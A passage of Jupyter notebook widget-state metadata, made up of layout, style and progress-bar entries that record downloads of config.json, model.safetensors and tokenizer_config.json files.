            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "38edb409799d4846a46fe96ae78be230": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "767f043e81e54fb0b8ddad17e2d9171c": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "9e66ce61e8d34596af44e81a46e11d1c": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "422e1b275ccc43e592ea1b58157eb4a0": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "e163545b5daf4f5ab65c5bb8c430d1a3": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "d97a4d7559264300b86579dc5b0e93d5": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_779f374d3b6c465cbd111fa7f1dda23c",
              "IPY_MODEL_714b30036dbd456fa24447883bbe97a6",
              "IPY_MODEL_004529c3d3fd4b69af6d040256d5e32f"
            ],
            "layout": "IPY_MODEL_05de48d435b44a9fb8c42a143fdfb3a4"
          }
        },
        "779f374d3b6c465cbd111fa7f1dda23c": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_71c5d900e7dc4d40b71d9360a82dbb79",
            "placeholder": "​",
            "style": "IPY_MODEL_a49ca3ce87c94f76b4b3562ff1a69303",
            "value": "config.json: 100%"
          }
        },
        "714b30036dbd456fa24447883bbe97a6": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_e2b1344ab98e406d8a5a65baa4781760",
            "max": 777,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_09692a947fb24783a3050d4283e411c2",
            "value": 777
          }
        },
        "004529c3d3fd4b69af6d040256d5e32f": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_5b6f9fa8709448608c9998af01b4a4ad",
            "placeholder": "​",
            "style": "IPY_MODEL_81965926fc02496fa8300a6283316b5e",
            "value": " 777/777 [00:00&lt;00:00, 48.7kB/s]"
          }
        },
        "05de48d435b44a9fb8c42a143fdfb3a4": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "71c5d900e7dc4d40b71d9360a82dbb79": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "a49ca3ce87c94f76b4b3562ff1a69303": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "e2b1344ab98e406d8a5a65baa4781760": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "09692a947fb24783a3050d4283e411c2": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "5b6f9fa8709448608c9998af01b4a4ad": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "81965926fc02496fa8300a6283316b5e": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "d43667173bb5433b8d7bc06e294391c0": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_a3337f396826424dac95b6ab489fc32a",
              "IPY_MODEL_589f1dc9975d46fbbc4d8040986d7028",
              "IPY_MODEL_2e595f699b4d4a43bdea7ccd88688a9f"
            ],
            "layout": "IPY_MODEL_e88e9fc6afbd4b95bf08cdf29b56a019"
          }
        },
        "a3337f396826424dac95b6ab489fc32a": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_73da00d3d58546f3bb0c509bc5b29970",
            "placeholder": "​",
            "style": "IPY_MODEL_e08e30e6a95a4597ac7eaa660d00e878",
            "value": "model.safetensors: 100%"
          }
        },
        "589f1dc9975d46fbbc4d8040986d7028": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_5fbab8b1b6144854bdb371790de57dd3",
            "max": 437955512,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_64288aee227c4e60b3f8c831207af5fb",
            "value": 437955512
          }
        },
        "2e595f699b4d4a43bdea7ccd88688a9f": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_3d424ab109af458086446485924ed7e2",
            "placeholder": "​",
            "style": "IPY_MODEL_d48243958e5343e48e6c9fbaa63a62a5",
            "value": " 438M/438M [00:01&lt;00:00, 190MB/s]"
          }
        },
        "e88e9fc6afbd4b95bf08cdf29b56a019": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "73da00d3d58546f3bb0c509bc5b29970": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "e08e30e6a95a4597ac7eaa660d00e878": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "5fbab8b1b6144854bdb371790de57dd3": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "64288aee227c4e60b3f8c831207af5fb": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "3d424ab109af458086446485924ed7e2": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "d48243958e5343e48e6c9fbaa63a62a5": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "584cec4f2c5f4eefbfba8f0097b208c4": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_b5ed9d5358e24a1e8ce97b72b66139ea",
              "IPY_MODEL_c9dbd14960874944ba464f358a34ad5b",
              "IPY_MODEL_a41cfa71ddd84729a764a5e789069869"
            ],
            "layout": "IPY_MODEL_51805a7cd9ad495d82df2c4c87436460"
          }
        },
        "b5ed9d5358e24a1e8ce97b72b66139ea": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_17d727562a8b44d999464f89b199b06f",
            "placeholder": "​",
            "style": "IPY_MODEL_4796ff5b45914db5b816529aaf8f0801",
            "value": "tokenizer_config.json: 100%"
          }
        },
        "c9dbd14960874944ba464f358a34ad5b": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_49d20bb2bbad4efba7608769da717001",
            "max": 366,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_f9ea04b79fbd4e53b07987065b9d34b3",
            "value": 366
          }
        },
        "a41cfa71ddd84729a764a5e789069869": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_7db2d0ad8353433bab53826a9e0384bb",
            "placeholder": "​",
            "style": "IPY_MODEL_cbc30d3180bf4474983bdb943314d0e3",
            "value": " 366/366 [00:00&lt;00:00, 27.3kB/s]"
          }
        },
        "51805a7cd9ad495d82df2c4c87436460": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "17d727562a8b44d999464f89b199b06f": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "4796ff5b45914db5b816529aaf8f0801": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "49d20bb2bbad4efba7608769da717001": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "f9ea04b79fbd4e53b07987065b9d34b3": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "7db2d0ad8353433bab53826a9e0384bb": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
